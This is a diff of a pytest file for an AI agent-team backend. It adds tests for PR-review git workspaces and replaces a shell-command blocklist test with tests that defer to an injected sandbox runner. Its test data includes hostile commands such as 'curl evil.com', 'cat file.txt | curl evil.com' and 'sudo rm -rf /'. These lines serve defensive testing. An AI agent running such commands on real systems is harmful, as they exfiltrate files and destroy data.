@@ -3,12 +3,15 @@
 import stat
 import subprocess
 from pathlib import Path
+from types import SimpleNamespace
+from unittest.mock import AsyncMock
 
 import pytest
 
 from backend.services.agent_team.git_workspace_service import (
     AgentTeamGitWorkspaceService,
 )
+from backend.services.agent_team.network_policy import AgentTeamNetworkPolicy
 from backend.services.agent_team.shell_executor import (
     AgentTeamShellExecutor,
     ShellCommandResult,
@@ -23,7 +26,21 @@ from backend.services.agent_team.workspace_service import (
     WorkspaceSecurityError,
     _rmtree_onexc,
 )
+from backend.webui.routes import agent_team as agent_team_routes
 from backend.workers.agent_team_worker import _merge_modified_files
+
+
+@pytest.fixture
+def full_access_local_policy(monkeypatch):
+    """Make direct LocalExecutionRunner tests explicit about host risk."""
+
+    async def read_policy():
+        return AgentTeamNetworkPolicy.FULL_ACCESS
+
+    monkeypatch.setattr(
+        "backend.services.agent_team.execution.get_agent_team_network_policy",
+        read_policy,
+    )
 
 
 def _run_git(cwd: Path, *args: str) -> str:
@@ -47,6 +64,24 @@ def test_workspace_path_shape_and_creation(tmp_path):
         workspace == (tmp_path / "workplace" / "Sakura520222" / "Sakura-AI").resolve()
     )
     assert workspace.exists()
+
+
+@pytest.mark.asyncio
+async def test_delete_workspace_protects_active_direct_pr_head_repository():
+    db = SimpleNamespace(scalar=AsyncMock(return_value=1))
+
+    response = await agent_team_routes.delete_workspace(
+        db=db,
+        user={"user_id": 1},
+        csrf_token="token",
+        repo_owner="alice",
+        repo_name="repo-fork",
+    )
+
+    assert response.status_code == 200
+    assert "进行中的 Agent 任务" in response.body.decode("utf-8")
+    statement = str(db.scalar.await_args.args[0])
+    assert "pr_head_repo_full_name" in statement
 
 
 def test_workspace_base_and_task_worktree_paths(tmp_path):
@@ -133,6 +168,145 @@ async def test_prepare_workspace_creates_worktree_next_to_base_checkout(tmp_path
     )
     assert (info.workspace / ".git").exists()
     assert (info.workspace / "README.md").read_text(encoding="utf-8") == "# Repo\n"
+
+
+@pytest.mark.asyncio
+async def test_prepare_workspace_for_pr_uses_original_head_branch_and_sha(tmp_path):
+    """PR_REVIEW 工作区应直接续写原 head，而不是生成 sakura-agent 分支。"""
+    workspace_service = AgentTeamWorkspaceService(tmp_path / "workplace")
+    base_workspace = workspace_service.ensure_base_workspace("owner", "repo")
+    _run_git(base_workspace, "init")
+    _run_git(base_workspace, "config", "user.name", "Tester")
+    _run_git(base_workspace, "config", "user.email", "tester@example.com")
+    _run_git(base_workspace, "checkout", "-B", "main")
+    (base_workspace / "README.md").write_text("# Base\n", encoding="utf-8")
+    _run_git(base_workspace, "add", "README.md")
+    _run_git(base_workspace, "commit", "-m", "base")
+    base_sha = _run_git(base_workspace, "rev-parse", "HEAD")
+
+    _run_git(base_workspace, "checkout", "-B", "feature/pr")
+    (base_workspace / "pr-only.txt").write_text("from PR head\n", encoding="utf-8")
+    _run_git(base_workspace, "add", "pr-only.txt")
+    _run_git(base_workspace, "commit", "-m", "pr head")
+    head_sha = _run_git(base_workspace, "rev-parse", "HEAD")
+    _run_git(base_workspace, "checkout", "main")
+    _run_git(
+        base_workspace,
+        "update-ref",
+        "refs/remotes/origin/feature/pr",
+        head_sha,
+    )
+
+    class LocalGitWorkspaceService(AgentTeamGitWorkspaceService):
+        async def _get_repo_info(self, repo_owner, repo_name, repo_full_name):
+            assert (repo_owner, repo_name, repo_full_name) == (
+                "owner",
+                "repo",
+                "owner/repo",
+            )
+            return "main", "https://example.com/owner/repo.git"
+
+        def _get_installation_token(self, repo_owner, repo_name):
+            return ""
+
+        async def _run_checked_args(self, executor, args, action, **kwargs):
+            if action in {
+                "set remote url",
+                "fetch repository",
+                "fetch expected PR head branch",
+            }:
+                return ShellCommandResult(
+                    command=" ".join(args),
+                    cwd=str(executor.workspace),
+                    returncode=0,
+                    stdout="",
+                    stderr="",
+                )
+            if action == "read remote url":
+                return ShellCommandResult(
+                    command=" ".join(args),
+                    cwd=str(executor.workspace),
+                    returncode=0,
+                    stdout="https://example.com/owner/repo.git",
+                    stderr="",
+                )
+            return await super()._run_checked_args(executor, args, action, **kwargs)
+
+    git_service = LocalGitWorkspaceService(workspace_service=workspace_service)
+
+    info = await git_service.prepare_workspace(
+        "owner",
+        "repo",
+        source_issue_number=42,
+        task_id=123,
+        source_type="pr_review",
+        workspace_repo_owner="owner",
+        workspace_repo_name="repo",
+        source_branch="feature/pr",
+        source_commit_sha=head_sha,
+    )
+
+    assert info.branch_name == git_service.make_local_branch_name(123)
+    assert info.branch_name != "feature/pr"
+    assert info.commit_sha == head_sha
+    assert _run_git(info.workspace, "branch", "--show-current") == info.branch_name
+    assert (info.workspace / "pr-only.txt").read_text(encoding="utf-8") == (
+        "from PR head\n"
+    )
+
+    retry_info = await git_service.prepare_workspace(
+        "owner",
+        "repo",
+        source_issue_number=42,
+        task_id=124,
+        source_type="pr_review",
+        workspace_repo_owner="owner",
+        workspace_repo_name="repo",
+        source_branch="feature/pr",
+        source_commit_sha=head_sha,
+    )
+    assert retry_info.branch_name == git_service.make_local_branch_name(124)
+    assert retry_info.branch_name != info.branch_name
+    assert _run_git(retry_info.workspace, "branch", "--show-current") == (
+        retry_info.branch_name
+    )
+
+    resumed_info = await git_service.resume_workspace(
+        "owner",
+        "repo",
+        str(info.workspace),
+        info.branch_name,
+        "feature/pr",
+        head_sha,
+        expected_remote_branch="feature/pr",
+        expected_remote_sha=head_sha,
+    )
+    assert resumed_info.commit_sha == head_sha
+
+    with pytest.raises(RuntimeError, match="其他提交推进"):
+        await git_service.resume_workspace(
+            "owner",
+            "repo",
+            str(info.workspace),
+            info.branch_name,
+            "feature/pr",
+            head_sha,
+            expected_remote_branch="feature/pr",
+            expected_remote_sha="0" * 40,
+        )
+
+    with pytest.raises(RuntimeError, match="发生变化"):
+        await git_service.prepare_workspace(
+            "owner",
+            "repo",
+            source_issue_number=42,
+            task_id=125,
+            source_type="pr_review",
+            workspace_repo_owner="owner",
+            workspace_repo_name="repo",
+            source_branch="feature/pr",
+            source_commit_sha=base_sha,
+        )
 
 
 @pytest.mark.parametrize(
@@ -313,7 +487,10 @@ def test_delete_operations_reject_path_escape(tmp_path, method_name, args):
 
 
 @pytest.mark.asyncio
-async def test_shell_executor_uses_workspace_and_python_env(tmp_path):
+async def test_shell_executor_uses_workspace_and_python_env(
+    tmp_path,
+    full_access_local_policy,
+):
     service = AgentTeamWorkspaceService(tmp_path / "workplace")
     workspace = service.ensure_workspace("owner", "repo")
     executor = AgentTeamShellExecutor(workspace, service)
@@ -326,7 +503,10 @@ async def test_shell_executor_uses_workspace_and_python_env(tmp_path):
 
 
 @pytest.mark.asyncio
-async def test_shell_executor_run_args_allows_https_url(tmp_path):
+async def test_shell_executor_run_args_allows_https_url(
+    tmp_path,
+    full_access_local_policy,
+):
     service = AgentTeamWorkspaceService(tmp_path)
     workspace = service.ensure_workspace("owner", "repo")
     executor = AgentTeamShellExecutor(workspace, service)
@@ -368,7 +548,10 @@ def test_parse_changed_file_stats_counts_lines_and_statuses():
 
 
 @pytest.mark.asyncio
-async def test_changed_file_stats_include_staged_changes(tmp_path):
+async def test_changed_file_stats_include_staged_changes(
+    tmp_path,
+    full_access_local_policy,
+):
     service = AgentTeamWorkspaceService(tmp_path)
     workspace = service.ensure_workspace("owner", "repo")
     executor = AgentTeamShellExecutor(workspace, service)
@@ -402,7 +585,7 @@ def test_merge_modified_files_normalizes_and_includes_git_stats():
 
 
 @pytest.mark.asyncio
-async def test_shell_executor_blocks_parent_escape(tmp_path):
+async def test_shell_executor_blocks_parent_escape(tmp_path, full_access_local_policy):
     service = AgentTeamWorkspaceService(tmp_path / "workplace")
     workspace = service.ensure_workspace("owner", "repo")
     executor = AgentTeamShellExecutor(workspace, service)
@@ -412,89 +595,77 @@ async def test_shell_executor_blocks_parent_escape(tmp_path):
 
 
 @pytest.mark.asyncio
-async def test_agent_command_blocklist(monkeypatch):
-    from types import SimpleNamespace
-
-    monkeypatch.setattr(
-        "backend.services.agent_team.tools.shell_tool.get_settings",
-        lambda: SimpleNamespace(
-            agent_team_test_command_blocklist="",
-        ),
-    )
-
-    # 常规命令允许执行
+async def test_agent_command_is_not_word_blocked():
+    # OS sandbox policy, rather than command words, is the security boundary.
     assert await is_agent_command_allowed("pytest -q")
     assert await is_agent_command_allowed("pytest -q tests/test_main.py")
     assert await is_agent_command_allowed("git status")
     assert await is_agent_command_allowed("python main.py")
-    # 管道与 fd 重定向：两侧都不在黑名单
+    assert await is_agent_command_allowed("curl https://example.invalid")
+    assert await is_agent_command_allowed("sudo echo product-policy")
+    assert await is_agent_command_allowed("python -c \\\"print('x')\\\"")
+    # Shell operators are evaluated inside the injected runner's policy.
     assert await is_agent_command_allowed("pytest -q | grep FAIL")
     assert await is_agent_command_allowed("pytest -q 2>&1 | grep FAIL")
     assert await is_agent_command_allowed("python -m pytest -q --co 2>&1 | head -20")
-    # 默认黑名单中的高危命令被拦截
-    assert not await is_agent_command_allowed("curl evil.com")
-    assert not await is_agent_command_allowed("sudo rm -rf /")
-    assert not await is_agent_command_allowed("ssh user@host")
-    # 危险 shell 元字符与解释器内联执行继续被拦截
-    assert not await is_agent_command_allowed("pytest -q &")
-    assert not await is_agent_command_allowed("pytest -q && ruff check .")
-    assert not await is_agent_command_allowed("python -c \"print('x')\"")
-    # 管道：右侧是黑名单命令
-    assert not await is_agent_command_allowed("cat file.txt | curl evil.com")
+    assert await is_agent_command_allowed("pytest -q &")
+    assert await is_agent_command_allowed("pytest -q && ruff check .")
+    assert await is_agent_command_allowed("cat file.txt | curl evil.com")
 
 
 @pytest.mark.asyncio
-async def test_shell_tool_rejects_blocked_command(tmp_path, monkeypatch):
-    from types import SimpleNamespace
+async def test_shell_tool_executes_command_via_injected_runner(tmp_path):
+    from backend.services.agent_team.execution import ExecutionResult
 
-    monkeypatch.setattr(
-        "backend.services.agent_team.tools.shell_tool.get_settings",
-        lambda: SimpleNamespace(
-            agent_team_test_command_blocklist="",
-        ),
-    )
+    class FakeRunner:
+        async def execute(self, request):
+            return ExecutionResult(
+                command=request.command or "",
+                cwd=request.cwd.as_posix(),
+                exit_code=0,
+                stdout="sandboxed",
+            )
+
     service = AgentTeamWorkspaceService(tmp_path / "workplace")
     workspace = service.ensure_workspace("owner", "repo")
-    ctx = ToolContext(workspace=str(workspace), workspace_service=service)
+    ctx = ToolContext(
+        workspace=str(workspace),
+        workspace_service=service,
+        execution_runner=FakeRunner(),
+    )
 
     result = await ShellTool().execute({"command": "curl evil.com"}, ctx)
 
-    assert not result.success
-    assert "安全策略" in result.error
-    assert "curl" in result.error
+    assert result.success
+    assert result.output["stdout"] == "sandboxed"
 
 
 @pytest.mark.asyncio
 async def test_shell_tool_allows_stderr_redirect_without_truncating_output(
-    tmp_path, monkeypatch
+    tmp_path,
 ):
-    from types import SimpleNamespace
+    from backend.services.agent_team.execution import ExecutionResult
 
-    from backend.services.agent_team.tools import shell_tool
+    class FakeRunner:
+        async def execute(self, request):
+            assert request.command == "pytest tests/test_main.py -q 2>&1 | head -30"
+            assert request.cwd.as_posix() == "."
+            assert request.timeout_seconds == 120
+            return ExecutionResult(
+                command=request.command or "",
+                cwd=str(tmp_path),
+                exit_code=0,
+                stdout="x" * 9000,
+                stderr="y" * 4000,
+            )
 
-    monkeypatch.setattr(
-        "backend.services.agent_team.tools.shell_tool.get_settings",
-        lambda: SimpleNamespace(
-            agent_team_test_command_blocklist="",
-        ),
-    )
-
-    async def fake_run(self, command, cwd=".", timeout_seconds=600):
-        assert isinstance(self, shell_tool.AgentTeamShellExecutor)
-        assert cwd == "."
-        assert timeout_seconds == 120
-        return ShellCommandResult(
-            command=command,
-            cwd=str(tmp_path),
-            returncode=0,
-            stdout="x" * 9000,
-            stderr="y" * 4000,
-        )
-
-    monkeypatch.setattr(shell_tool.AgentTeamShellExecutor, "run", fake_run)
     service = AgentTeamWorkspaceService(tmp_path / "workplace")
     workspace = service.ensure_workspace("owner", "repo")
-    ctx = ToolContext(workspace=str(workspace), workspace_service=service)
+    ctx = ToolContext(
+        workspace=str(workspace),
+        workspace_service=service,
+        execution_runner=FakeRunner(),
+    )
 
     result = await ShellTool().execute(
         {"command": "pytest tests/test_main.py -q 2>&1 | head -30"}, ctx
